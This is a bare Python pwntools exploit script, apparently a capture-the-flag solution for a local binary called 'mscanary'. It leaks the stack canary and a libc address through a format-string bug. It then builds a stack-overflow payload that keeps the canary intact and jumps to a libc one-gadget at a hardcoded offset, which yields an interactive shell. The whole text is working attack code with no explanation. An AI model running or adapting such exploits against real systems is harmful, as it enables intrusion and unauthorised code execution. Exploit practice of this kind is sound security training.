from pwn import *
elf = ELF('./mscanary', checksec=False)
libc = ELF('./libc/libc6_2.28-0ubuntu1_amd64.so', checksec=False)
p = elf.process()
p.sendlineafter(b'!\n', '%{0:d}$p|%{1:d}$p'.format(21,5).encode())
leak = p.recvline().strip().decode().split('|')
canary = eval(leak[0])
libc.address = eval(leak[1]) - 0x1eb580
log.info('canary 0x%x'%canary)
log.info('base 0x%x'%libc.address)
payload = b''.join([
    cyclic(104), p64(canary), b'B'*8,
    p64(libc.address + 0x501e3),
    b'\x00'*(0x40+8)
])
p.sendline(payload)
p.clean()
p.interactive()